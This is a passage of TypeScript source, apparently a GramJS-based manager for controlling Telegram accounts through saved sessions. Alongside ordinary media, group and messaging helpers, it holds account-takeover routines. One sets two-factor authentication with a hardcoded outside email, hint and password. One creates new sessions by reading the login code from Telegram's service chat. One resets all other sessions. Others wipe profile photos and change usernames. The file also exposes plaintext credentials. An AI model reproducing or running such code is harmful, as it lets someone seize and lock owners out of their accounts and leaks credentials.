<Api.Photo>message.photo;\n\n                const data = {\n                    id: inputLocation.id,\n                    accessHash: inputLocation.accessHash,\n                    fileReference: inputLocation.fileReference,\n                };\n\n                if (media instanceof Api.MessageMediaPhoto) {\n                    contentType = 'image/jpeg';\n                    filename = 'photo.jpg';\n                    fileLocation = new Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });\n                } else if (media instanceof Api.MessageMediaDocument) {\n                    contentType = (media as any).mimeType || 'video/mp4';\n                    filename = 'video.mp4';\n                    fileLocation = new Api.InputDocumentFileLocation({ ...data, thumbSize: '' });\n                } else {\n                    return res.status(415).send('Unsupported media type');\n                }\n\n                res.setHeader('Content-Type', contentType);\n                res.setHeader('Content-Disposition', `attachment; filename=\"${filename}\"`);\n\n                const chunkSize = 512 * 1024; // 512 KB chunks\n\n                for await (const chunk of this.client.iterDownload({\n                    file: fileLocation,\n                    offset: bigInt[0],\n                    limit: 5 * 1024 * 1024, // 80 MB limit\n                    requestSize: chunkSize,\n                })) {\n                    res.write(chunk); // Stream each chunk to the client\n                }\n                res.end();\n            } else {\n                res.status(404).send('Media not found');\n            }\n        } catch (error) {\n            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {\n                return res.status(404).send('File reference expired');\n            }\n            console.error('Error downloading media:', error);\n            res.status(500).send('Error downloading media');\n        }\n    }\n\n    private async downloadWithTimeout<T>(promise: Promise<T>, timeout: number): Promise<T> {\n        return Promise.race([\n            promise,\n            new Promise<T>((_, reject) =>\n                setTimeout(() => reject(new Error('Download timeout')), timeout)\n            )\n        ]);\n    }\n\n    private getMediaDetails(media: Api.MessageMediaDocument) {\n        if (!media?.document) return null;\n\n        const doc = media.document;\n        if (doc instanceof Api.DocumentEmpty) return null;\n        const videoAttr = doc.attributes.find(attr =>\n            attr instanceof Api.DocumentAttributeVideo\n        ) as Api.DocumentAttributeVideo;\n\n        const fileNameAttr = doc.attributes.find(attr =>\n            attr instanceof Api.DocumentAttributeFilename\n        ) as Api.DocumentAttributeFilename;\n\n        return {\n            size: doc.size,\n            mimeType: doc.mimeType,\n            fileName: fileNameAttr?.fileName || null,\n            duration: videoAttr?.duration || null,\n            width: videoAttr?.w || null,\n            height: videoAttr?.h || null\n        };\n    }\n\n    private async downloadFileFromUrl(url: string): Promise<Buffer> {\n        try {\n            const response = await axios.get(url, {\n                responseType: 'arraybuffer',\n                timeout: 30000\n            });\n            return Buffer.from(response.data);\n        } catch (error) {\n            throw new Error(`Failed to download file: ${error.message}`);\n        }\n    }\n\n    async forwardMessage(toChatId: string, fromChatId: string, messageId: number) {\n        try {\n            await this.client.forwardMessages(toChatId, { fromPeer: fromChatId, messages: messageId })\n        } catch (error) {\n            console.log(\"Failed to Forward Message : \", error.errorMessage);\n        }\n    }\n\n    async updateUsername(baseUsername) {\n        let newUserName = ''\n        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';\n        let increment = 0;\n        if (username === '') {\n            try {\n                await this.client.invoke(new Api.account.UpdateUsername({ username }));\n                console.log(`Removed Username successfully.`);\n            } catch (error) {\n                console.log(error)\n            }\n        } else {\n            while (increment < 10) {\n                try {\n                    const result = await this.client.invoke(\n                        new Api.account.CheckUsername({ username })\n                    );\n                    console.log(result, \" - \", username)\n                    if (result) {\n                        await this.client.invoke(new Api.account.UpdateUsername({ username }));\n                        console.log(`Username '${username}' updated successfully.`);\n                        newUserName = username\n                        break;\n                    } else {\n                        username = baseUsername + increment;\n                        increment++;\n                        await sleep(2000);\n                    }\n                } catch (error) {\n                    console.log(error.message)\n                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {\n                        newUserName = username;\n                        break;\n                    }\n                    username = baseUsername + increment;\n                    increment++;\n                    await sleep(2000);\n                }\n            }\n        }\n        return newUserName;\n    }\n\n    async updatePrivacy() {\n        try {\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneCall(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Calls Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"PP Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyForwards(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"forwards Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Number Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll(),\n                    ],\n                })\n            );\n            console.log(\"LAstSeen Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyAbout(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n        }\n        catch (e) {\n            throw e\n        }\n    }\n\n    async sendViewOnceMedia(chatId: string, buffer: Buffer, caption = '', isVideo?: boolean, filename?: string): Promise<Api.TypeUpdates> {\n        if (!this.client) throw new Error('Client is not initialized');\n\n        try {\n            const actualFilename = filename || `viewonce_${Date.now()}.${isVideo ? 'mp4' : 'jpg'}`;\n            const mimeType = isVideo ? 'video/mp4' : 'image/jpeg';\n            const inputFile = await this.client.uploadFile({\n                file: new CustomFile(actualFilename, buffer.length, actualFilename, buffer),\n                workers: 1\n            });\n            const result = await this.client.invoke(new Api.messages.SendMedia({\n                peer: chatId,\n                media: isVideo\n                    ? new Api.InputMediaUploadedDocument({\n                        file: inputFile,\n                        mimeType,\n                        attributes: [\n                            new Api.DocumentAttributeVideo({\n                                supportsStreaming: true,\n                                duration: 0,\n                                w: 0,\n                                h: 0\n                            })\n                        ],\n                        ttlSeconds: 10\n                    })\n                    : new Api.InputMediaUploadedPhoto({\n                        file: inputFile,\n                        ttlSeconds: 10\n                    }),\n                message: caption,\n                randomId: bigInt(Math.floor(Math.random() * 1000000000))\n            }));\n\n            console.log(`Sent view-once ${isVideo ? 'video' : 'photo'} to chat ${chatId}`);\n            return result;\n        } catch (error) {\n            console.error('Error sending view-once media:', error);\n            throw error;\n        }\n    }\n\n\n    async getFileUrl(url: string, filename: string): Promise<string> {\n        const response = await axios.get(url, { responseType: 'stream' });\n        const filePath = `/tmp/${filename}`;\n        await new Promise((resolve, reject) => {\n            const writer = fs.createWriteStream(filePath);\n            response.data.pipe(writer);\n            writer.on('finish', () => resolve(true));\n            writer.on('error', reject);\n        });\n        return filePath;\n    }\n\n    async updateProfilePic(image) {\n        try {\n            const file = await this.client.uploadFile({\n                file: new CustomFile(\n                    'pic.jpg',\n                    fs.statSync(\n                        image\n                    ).size,\n                    image\n                ),\n                workers: 1,\n            });\n            console.log(\"file uploaded\")\n            await this.client.invoke(new Api.photos.UploadProfilePhoto({\n                file: file,\n            }));\n            console.log(\"profile pic updated\")\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async hasPassword() {\n        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());\n        return passwordInfo.hasPassword\n    }\n\n    async set2fa() {\n        if (!(await this.hasPassword())) {\n            console.log(\"Password Does not exist, Setting 2FA\");\n\n            const imapService = MailReader.getInstance();\n            const twoFaDetails = {\n                email: \"storeslaksmi@gmail.com\",\n                hint: \"password - India143\",\n                newPassword: \"Ajtdmwajt1@\",\n            };\n\n            try {\n                await imapService.connectToMail();\n                const checkMailInterval = setInterval(async () => {\n                    console.log(\"Checking if mail is ready\");\n\n                    if (imapService.isMailReady()) {\n                        clearInterval(checkMailInterval);\n                        console.log(\"Mail is ready, checking code!\");\n                        await this.client.updateTwoFaSettings({\n                            isCheckPassword: false,\n                            email: twoFaDetails.email,\n                            hint: twoFaDetails.hint,\n                            newPassword: twoFaDetails.newPassword,\n                            emailCodeCallback: async (length) => {\n                                console.log(\"Code sent\");\n                                return new Promise(async (resolve, reject) => {\n                                    let retry = 0;\n                                    const codeInterval = setInterval(async () => {\n                                        try {\n                                            console.log(\"Checking code\");\n                                            retry++;\n                                            if (imapService.isMailReady() && retry < 4) {\n                                                const code = await imapService.getCode();\n                                                console.log('Code:', code);\n                                                if (code) {\n                                                    await imapService.disconnectFromMail();\n                                                    clearInterval(codeInterval);\n                                                    resolve(code);\n                                                }\n                                            } else {\n                                                clearInterval(codeInterval);\n                                                await imapService.disconnectFromMail();\n                                                reject(new Error(\"Failed to retrieve code\"));\n                                            }\n                                        } catch (error) {\n                                            clearInterval(codeInterval);\n                                            await imapService.disconnectFromMail();\n                                            reject(error);\n                                        }\n                                    }, 10000);\n                                });\n                            },\n                            onEmailCodeError: (e) => {\n                                console.error('Email code error:', parseError(e));\n                                return Promise.resolve(\"error\");\n                            }\n                        });\n\n                        return twoFaDetails;\n                    } else {\n                        console.log(\"Mail not ready yet\");\n                    }\n                }, 5000);\n            } catch (e) {\n                console.error(\"Unable to connect to mail server:\", parseError(e));\n            }\n        } else {\n            console.log(\"Password already exists\");\n        }\n    }\n\n\n    async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const filePath = await this.getFileUrl(url, filename);\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\n        await this.client.sendFile(id, { file, caption });\n    }\n\n    async sendFileChat(id: string, url: string, caption: string, filename: string): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const filePath = await this.getFileUrl(url, filename);\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\n        await this.client.sendFile(id, { file, caption });\n    }\n\n    async deleteProfilePhotos() {\n        try {\n            const result = await this.client.invoke(\n                new Api.photos.GetUserPhotos({\n                    userId: \"me\"\n                })\n            );\n            console.log(`Profile Pics found: ${result.photos.length}`)\n            if (result && result.photos?.length > 0) {\n                const res = await this.client.invoke(\n                    new Api.photos.DeletePhotos({\n                        id: <Api.TypeInputPhoto[]><unknown>result.photos\n                    }))\n            }\n            console.log(\"Deleted profile Photos\");\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async createNewSession(): Promise<string> {\n        const me = <Api.User>await this.client.getMe();\n        console.log(\"Phne:\", me.phone);\n        const newClient = new TelegramClient(new StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {\n            connectionRetries: 1,\n        });\n        await newClient.start({\n            phoneNumber: me.phone,\n            password: async () => \"Ajtdmwajt1@\",\n            phoneCode: async () => {\n                console.log('Waiting for the OTP code from chat ID 777000...');\n                return await this.waitForOtp();\n            },\n            onError: (err: any) => { throw err },\n\n        });\n        const session = <string><unknown>newClient.session.save();\n        await newClient.disconnect();\n        // await newClient.destroy();\n        console.log(\"New Session: \", session)\n        return session\n    }\n\n    async waitForOtp() {\n        for (let i = 0; i < 3; i++) {\n            try {\n                console.log(\"Attempt : \", i)\n                const messages = await this.client.getMessages('777000', { limit: 1 });\n                const message = messages[0];\n                if (message && message.date && message.date * 1000 > Date.now() - 60000) {\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\n                    console.log(\"returning: \", code);\n                    return code;\n                } else {\n                    console.log(\"Message Date: \", new Date(message.date * 1000).toISOString(), \"Now: \", new Date(Date.now() - 60000).toISOString());\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\n                    console.log(\"Skipped Code: \", code);\n                    if (i == 2) {\n                        return code;\n                    }\n                    await sleep(5000)\n                }\n            } catch (err) {\n                await sleep(2000)\n                console.log(err)\n            }\n        }\n    }\n\n    async createGroupWithOptions(options: GroupOptions): Promise<Api.Chat | Api.Channel> {\n        if (!this.client) throw new Error('Client not initialized');\n        const result = await this.createGroupOrChannel(options);\n\n        // Find the channel in updates safely\n        let channelId: bigInt.BigInteger | undefined;\n        if ('updates' in result) {\n            const updates = Array.isArray(result.updates) ? result.updates : [result.updates];\n            const channelUpdate = updates.find(u => u instanceof Api.UpdateChannel);\n            if (channelUpdate && 'channelId' in channelUpdate) {\n                channelId = channelUpdate.channelId;\n            }\n        }\n\n        if (!channelId) {\n            throw new Error('Failed to create channel');\n        }\n\n        const channel = await this.client.getEntity(channelId);\n        if (!(channel instanceof Api.Channel)) {\n            throw new Error('Created entity is not a channel');\n        }\n\n        if (options.members?.length) {\n            const users = await Promise.all(\n                options.members.map(member => this.client.getInputEntity(member))\n            );\n\n            await this.client.invoke(new Api.channels.InviteToChannel({\n                channel: await this.client.getInputEntity(channel),\n                users\n            }));\n        }\n\n        if (options.photo) {\n            const buffer = await this.downloadFileFromUrl(options.photo);\n            const inputFile = await this.client.uploadFile({\n                file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),\n                workers: 1\n            });\n\n            await this.client.invoke(new Api.channels.EditPhoto({\n                channel: await this.client.getInputEntity(channel),\n                photo: new Api.InputChatUploadedPhoto({\n                    file: inputFile\n                })\n            }));\n        }\n\n        return channel;\n    }\n\n    async updateGroupSettings(settings: {\n        groupId: string;\n        title?: string;\n        description?: string;\n        slowMode?: number;\n        memberRestrictions?: any;\n        username?: string;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getEntity(settings.groupId);\n\n        if (settings.title) {\n            await this.client.invoke(new Api.channels.EditTitle({\n                channel: channel,\n                title: settings.title || ''\n            }))\n        };\n\n        if (settings.description) {\n            await this.client.invoke(new Api.messages.EditChatAbout({\n                peer: channel,\n                about: settings.description\n            }));\n        }\n\n        if (settings.username) {\n            await this.client.invoke(new Api.channels.UpdateUsername({\n                channel: channel,\n                username: settings.username\n            }));\n        }\n\n\n        if (settings.slowMode !== undefined) {\n            await this.client.invoke(new Api.channels.ToggleSlowMode({\n                channel: channel,\n                seconds: settings.slowMode\n            }));\n        }\n\n        return true;\n    }\n\n    async scheduleMessageSend(opts: MessageScheduleOptions) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const scheduleDate = Math.floor(opts.scheduledTime.getTime() / 1000);\n\n        if (opts.media) {\n            const buffer = await this.downloadFileFromUrl(opts.media.url);\n\n            const uploadedFile = await this.client.uploadFile({\n                file: new CustomFile('media', buffer.length, 'media', buffer),\n                workers: 1\n            });\n\n            return this.client.sendFile(opts.chatId, {\n                file: uploadedFile,\n                caption: opts.message,\n                forceDocument: opts.media.type === 'document',\n                scheduleDate\n            });\n        }\n\n        return this.client.sendMessage(opts.chatId, {\n            message: opts.message,\n            schedule: Math.floor(opts.scheduledTime.getTime() / 1000)\n        });\n    }\n\n    async getScheduledMessages(chatId: string): Promise<Api.TypeMessage[]> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const result = await this.client.invoke(new Api.messages.GetScheduledHistory({\n            peer: chatId,\n            hash: bigInt(0)\n        }));\n\n        return 'messages' in result && Array.isArray(result.messages)\n            ? result.messages.filter(msg => msg instanceof Api.Message)\n            : [];\n    }\n\n    async sendMediaAlbum(album: MediaAlbumOptions) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const mediaFiles = await Promise.all(\n            album.media.map(async (item) => {\n                const buffer = await this.downloadFileFromUrl(item.url);\n                const uploadedFile = await this.client.uploadFile({\n                    file: new CustomFile('media', buffer.length, 'media', buffer),\n                    workers: 1\n                });\n\n                return new Api.InputSingleMedia({\n                    media: item.type === 'photo'\n                        ? new Api.InputMediaUploadedPhoto({ file: uploadedFile })\n                        : new Api.InputMediaUploadedDocument({\n                            file: uploadedFile,\n                            mimeType: item.type === 'video' ? 'video/mp4' : 'application/octet-stream',\n                            attributes: []\n                        }),\n                    message: item.caption || '',\n                    entities: []\n                });\n            })\n        );\n\n        return this.client.invoke(new Api.messages.SendMultiMedia({\n            peer: album.chatId,\n            multiMedia: mediaFiles\n        }));\n    }\n\n    async sendMessage(params: { peer: string, parseMode?: string, message: string }) {\n        if (!this.client) throw new Error('Client not initialized');\n        const { peer, parseMode, message } = params;\n        return await this.client.sendMessage(peer, { message, parseMode });\n    }\n\n    async sendVoiceMessage(voice: {\n        chatId: string;\n        url: string;\n        duration?: number;\n        caption?: string;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const buffer = await this.downloadFileFromUrl(voice.url);\n\n        return await this.client.invoke(new Api.messages.SendMedia({\n            peer: voice.chatId,\n            media: new Api.InputMediaUploadedDocument({\n                file: await this.client.uploadFile({\n                    file: new CustomFile('voice.ogg', buffer.length, 'voice.ogg', buffer),\n                    workers: 1\n                }),\n                mimeType: 'audio/ogg',\n                attributes: [\n                    new Api.DocumentAttributeAudio({\n                        voice: true,\n                        duration: voice.duration || 0\n                    })\n                ]\n            }),\n            message: voice.caption || '',\n            randomId: bigInt(Math.floor(Math.random() * 1000000000))\n        }));\n    }\n\n    async cleanupChat(cleanup: {\n        chatId: string;\n        beforeDate?: Date;\n        onlyMedia?: boolean;\n        excludePinned?: boolean;\n        revoke?: boolean;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n        cleanup.revoke = cleanup.revoke !== undefined ? cleanup.revoke : true;\n\n        const messages = await this.client.getMessages(cleanup.chatId, {\n            limit: 1000,\n            ...(cleanup.beforeDate && {\n                offsetDate: Math.floor(cleanup.beforeDate.getTime() / 1000)\n            })\n        });\n\n        const toDelete = messages.filter(msg => {\n            if (cleanup.excludePinned && msg.pinned) return false;\n            if (cleanup.onlyMedia && !msg.media) return false;\n            return true;\n        });\n\n        if (toDelete.length > 0) {\n            await this.client.deleteMessages(cleanup.chatId, toDelete.map(m => m.id), {\n                revoke: cleanup.revoke\n            })\n        }\n\n        return { deletedCount: toDelete.length };\n    }\n\n    async updatePrivacyBatch(settings: {\n        phoneNumber?: 'everybody' | 'contacts' | 'nobody';\n        lastSeen?: 'everybody' | 'contacts' | 'nobody';\n        profilePhotos?: 'everybody' | 'contacts' | 'nobody';\n        forwards?: 'everybody' | 'contacts' | 'nobody';\n        calls?: 'everybody' | 'contacts' | 'nobody';\n        groups?: 'everybody' | 'contacts' | 'nobody';\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const privacyRules = {\n            everybody: [new Api.InputPrivacyValueAllowAll()],\n            contacts: [new Api.InputPrivacyValueAllowContacts()],\n            nobody: [new Api.InputPrivacyValueDisallowAll()]\n        };\n\n        const updates = [];\n\n        const privacyMap = {\n            phoneNumber: Api.InputPrivacyKeyPhoneNumber,\n            lastSeen: Api.InputPrivacyKeyStatusTimestamp,\n            profilePhotos: Api.InputPrivacyKeyProfilePhoto,\n            forwards: Api.InputPrivacyKeyForwards,\n            calls: Api.InputPrivacyKeyPhoneCall,\n            groups: Api.InputPrivacyKeyChatInvite\n        };\n\n        for (const [key, value] of Object.entries(settings)) {\n            if (value && key in privacyMap) {\n                updates.push(this.client.invoke(new Api.account.SetPrivacy({\n                    key: new privacyMap[key](),\n                    rules: privacyRules[value]\n                })));\n            }\n        }\n\n        await Promise.all(updates);\n        return true;\n    }\n\n    async getSessionInfo() {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const [authorizationsResult, devicesResult] = await Promise.all([\n            this.client.invoke(new Api.account.GetAuthorizations()),\n            this.client.invoke(new Api.account.GetWebAuthorizations())\n        ]);\n\n        const sessions = authorizationsResult.authorizations.map(auth => ({\n            hash: auth.hash.toString(),\n            deviceModel: auth.deviceModel,\n            platform: auth.platform,\n            systemVersion: auth.systemVersion,\n            appName: auth.appName,\n            dateCreated: new Date(auth.dateCreated * 1000),\n            dateActive: new Date(auth.dateActive * 1000),\n            ip: auth.ip,\n            country: auth.country,\n            region: auth.region\n        }));\n\n        const webSessions = devicesResult.authorizations.map(auth => ({\n            hash: auth.hash.toString(),\n            domain: auth.domain,\n            browser: auth.browser,\n            platform: auth.platform,\n            dateCreated: new Date(auth.dateCreated * 1000),\n            dateActive: new Date(auth.dateActive * 1000),\n            ip: auth.ip,\n            region: auth.region\n        }));\n\n        return {\n            sessions,\n            webSessions\n        };\n    }\n\n    async terminateSession(options: {\n        hash: string;\n        type: 'app' | 'web';\n        exceptCurrent?: boolean;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        if (options.exceptCurrent) {\n            if (options.type === 'app') {\n                await this.client.invoke(new Api.auth.ResetAuthorizations());\n            } else {\n                await this.client.invoke(new Api.account.ResetWebAuthorizations());\n            }\n            return true;\n        }\n\n        if (options.type === 'app') {\n            await this.client.invoke(new Api.account.ResetAuthorization({\n                hash: bigInt(options.hash)\n            }));\n        } else {\n            await this.client.invoke(new Api.account.ResetWebAuthorization({\n                hash: bigInt(options.hash)\n            }));\n        }\n        return true;\n    }\n\n    async getChatStatistics(chatId: string, period: 'day' | 'week' | 'month') {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const now = Math.floor(Date.now() / 1000);\n        const periodInSeconds = {\n            day: 24 * 60 * 60,\n            week: 7 * 24 * 60 * 60,\n            month: 30 * 24 * 60 * 60\n        }[period];\n\n        const messages = await this.client.getMessages(chatId, {\n            limit: 100,\n            offsetDate: now - periodInSeconds\n        });\n\n        const stats = {\n            period,\n            totalMessages: messages.length,\n            uniqueSenders: new Set(messages.map(m => m.fromId?.toString()).filter(Boolean)).size,\n            messageTypes: {\n                text: messages.filter(m => !m.media && m.message).length,\n                photo: messages.filter(m => m.media && m.media.className === 'MessageMediaPhoto').length,\n                video: messages.filter(m => {\n                    if (!m.media || m.media.className !== 'MessageMediaDocument') return false;\n                    const doc = m.media.document;\n                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('video/');\n                }).length,\n                voice: messages.filter(m => {\n                    if (!m.media || m.media.className !== 'MessageMediaDocument') return false;\n                    const doc = m.media.document;\n                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('audio/');\n                }).length,\n                other: messages.filter(m => m.media && !['MessageMediaPhoto', 'MessageMediaDocument'].includes(m.media.className)).length\n            },\n            topSenders: Object.entries(\n                messages.reduce((acc, msg) => {\n                    const senderId = msg.fromId?.toString();\n                    if (senderId) {\n                        acc[senderId] = (acc[senderId] || 0) + 1;\n                    }\n                    return acc;\n                }, {} as Record<string, number>)\n            )\n                .sort(([, a], [, b]) => b - a)\n                .slice(0, 10)\n                .map(([id, count]) => ({ id, count })),\n            mostActiveHours: Object.entries(\n                messages.reduce((acc, msg) => {\n                    const hour = new Date(msg.date * 1000).getHours();\n                    acc[hour] = (acc[hour] || 0) + 1;\n                    return acc;\n                }, {} as Record<number, number>)\n            )\n                .sort(([, a], [, b]) => b - a)\n                .map(([hour, count]) => ({ hour: Number(hour), count }))\n        };\n\n        return stats;\n    }\n\n    private getMediaExtension(media: any): string {\n        if (!media) return 'bin';\n\n        switch (media.className) {\n            case 'MessageMediaPhoto':\n                return 'jpg';\n            case 'MessageMediaDocument':\n                const doc = media.document;\n                if (!doc || !('mimeType' in doc)) return 'bin';\n\n                const mime = doc.mimeType;\n                if (mime?.startsWith('video/')) return 'mp4';\n                if (mime?.startsWith('image/')) return mime.split('/')[1];\n                if (mime?.startsWith('audio/')) return 'ogg';\n                return 'bin';\n            default:\n                return 'bin';\n        }\n    }\n\n    async setContentFilters(filters: ContentFilter) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        this.contentFilters.set(filters.chatId, filters);\n\n        if (!this.filterHandler) {\n            this.filterHandler = this.client.addEventHandler(async (event) => {\n                if (event instanceof NewMessageEvent) {\n                    const message = event.message;\n                    const chatId = message.chatId?.toString();\n                    const filter = this.contentFilters.get(chatId);\n\n                    if (!filter) return;\n\n                    const shouldFilter = await this.evaluateMessage(message, filter);\n                    if (shouldFilter) {\n                        for (const action of filter.actions) {\n                            await this.executeFilterAction(action, message);\n                        }\n                    }\n                }\n            }, new NewMessage({}));\n        }\n    }\n\n    private async evaluateMessage(message: Api.Message, filter: ContentFilter): Promise<boolean> {\n        if (filter.keywords?.length) {\n            const messageText = message.message.toLowerCase();\n            if (filter.keywords.some(keyword => messageText.includes(keyword.toLowerCase()))) {\n                return true;\n            }\n        }\n\n        if (filter.mediaTypes?.length && message.media) {\n            const mediaType = this.getMediaType(message.media);\n            if (filter.mediaTypes.includes(mediaType)) {\n                return true;\n            }\n        }\n\n        return false;\n    }\n\n    private async executeFilterAction(action: 'delete' | 'warn' | 'mute', message: Api.Message) {\n        try {\n            switch (action) {\n                case 'delete':\n                    await this.client.deleteMessages(message.chatId, [message.id], { revoke: true });\n                    break;\n                case 'warn':\n                    await this.client.sendMessage(message.chatId, {\n                        message: ` Message filtered due to content policy.`,\n                        replyTo: message.id\n                    });\n                    break;\n                case 'mute':\n                    if (message.fromId) {\n                        await this.client.invoke(new Api.channels.EditBanned({\n                            channel: message.chatId,\n                            participant: message.fromId,\n                            bannedRights: new Api.ChatBannedRights({\n                                untilDate: Math.floor(Date.now() / 1000) + 3600,\n                                sendMessages: true\n                            })\n                        }));\n                    }\n                    break;\n            }\n        } catch (error) {\n            console.error(`Failed to execute filter action ${action}:`, error);\n        }\n    }\n\n    private getSearchFilter(filter: string): Api.TypeMessagesFilter {\n        switch (filter) {\n            case 'photo': return new Api.InputMessagesFilterPhotos();\n            case 'video': return new Api.InputMessagesFilterVideo();\n            case 'document': return new Api.InputMessagesFilterDocument();\n            case 'url': return new Api.InputMessagesFilterUrl();\n            case 'roundVideo': return new Api.InputMessagesFilterRoundVideo();\n            case 'phtotoVideo': return new Api.InputMessagesFilterPhotoVideo();\n            case 'voice': return new Api.InputMessagesFilterVoice();\n            case 'roundVoice': return new Api.InputMessagesFilterRoundVoice();\n            case 'gif': return new Api.InputMessagesFilterGif();\n            case 'sticker': return new Api.InputMessagesFilterDocument();\n            case 'animation': return new Api.InputMessagesFilterDocument();\n            case 'music': return new Api.InputMessagesFilterMusic();\n            case 'chatPhoto': return new Api.InputMessagesFilterChatPhotos();\n            case 'location': return new Api.InputMessagesFilterGeo();\n            case 'contact': return new Api.InputMessagesFilterContacts();\n            case 'chatPhoto': return new Api.InputMessagesFilterChatPhotos();\n            case 'phoneCalls': return new Api.InputMessagesFilterPhoneCalls({ missed: false });\n            default: return new Api.InputMessagesFilterEmpty();\n        }\n    }\n\n    private getMediaType(media: Api.TypeMessageMedia): 'photo' | 'video' | 'document' {\n        if (media instanceof Api.MessageMediaPhoto) {\n            return 'photo';\n        } else if (media instanceof Api.MessageMediaDocument) {\n            const document = media.document as Api.Document;\n            if (document.attributes.some(attr => attr instanceof Api.DocumentAttributeVideo)) {\n                return 'video';\n            }\n            return 'document';\n        }\n        return 'document';\n    }\n\n    private getEntityId(entity: Api.TypeInputPeer | Api.TypeUser | Api.TypeChat): string {\n        if (entity instanceof Api.User) return entity.id.toString();\n        if (entity instanceof Api.Channel) return entity.id.toString();\n        if (entity instanceof Api.Chat) return entity.id.toString();\n        return '';\n    }\n\n    async addGroupMembers(groupId: string, members: string[]): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const users = await Promise.all(\n            members.map(member => this.client.getInputEntity(member))\n        );\n\n        await this.client.invoke(new Api.channels.InviteToChannel({\n            channel: channel,\n            users\n        }));\n    }\n\n    async removeGroupMembers(groupId: string, members: string[]): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        for (const member of members) {\n            const user = await this.client.getInputEntity(member);\n            await this.client.invoke(new Api.channels.EditBanned({\n                channel: channel,\n                participant: user,\n                bannedRights: new Api.ChatBannedRights({\n                    untilDate: 0,\n                    viewMessages: true,\n                    sendMessages: true,\n                    sendMedia: true,\n                    sendStickers: true,\n                    sendGifs: true,\n                    sendGames: true,\n                    sendInline: true,\n                    embedLinks: true\n                })\n            }));\n        }\n    }\n\n    async promoteToAdmin(\n        groupId: string,\n        userId: string,\n        permissions?: {\n            changeInfo?: boolean;\n            postMessages?: boolean;\n            editMessages?: boolean;\n            deleteMessages?: boolean;\n            banUsers?: boolean;\n            inviteUsers?: boolean;\n            pinMessages?: boolean;\n            addAdmins?: boolean;\n            anonymous?: boolean;\n            manageCall?: boolean;\n        },\n        rank?: string\n    ): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const user = await this.client.getInputEntity(userId);\n\n        await this.client.invoke(new Api.channels.EditAdmin({\n            channel: channel,\n            userId: user,\n            adminRights: new Api.ChatAdminRights({\n                changeInfo: permissions?.changeInfo ?? false,\n                postMessages: permissions?.postMessages ?? false,\n                editMessages: permissions?.editMessages ?? false,\n                deleteMessages: permissions?.deleteMessages ?? false,\n                banUsers: permissions?.banUsers ?? false,\n                inviteUsers: permissions?.inviteUsers ?? true,\n                pinMessages: permissions?.pinMessages ?? false,\n                addAdmins: permissions?.addAdmins ?? false,\n                anonymous: permissions?.anonymous ?? false,\n                manageCall: permissions?.manageCall ?? false,\n                other: false\n            }),\n            rank: rank || ''\n        }));\n    }\n\n    async demoteAdmin(groupId: string, userId: string): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const user = await this.client.getInputEntity(userId);\n\n        await this.client.invoke(new Api.channels.EditAdmin({\n            channel: channel,\n            userId: user,\n            adminRights: new Api.ChatAdminRights({\n                changeInfo: false,\n                postMessages: false,\n                editMessages: false,\n                deleteMessages: false,\n                banUsers: false,\n                inviteUsers: false,\n                pinMessages: false,\n                addAdmins: false,\n                anonymous: false,\n                manageCall: false,\n                other: false\n            }),\n            rank: ''\n        }));\n    }\n\n    async unblockGroupUser(groupId: string, userId: string): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await 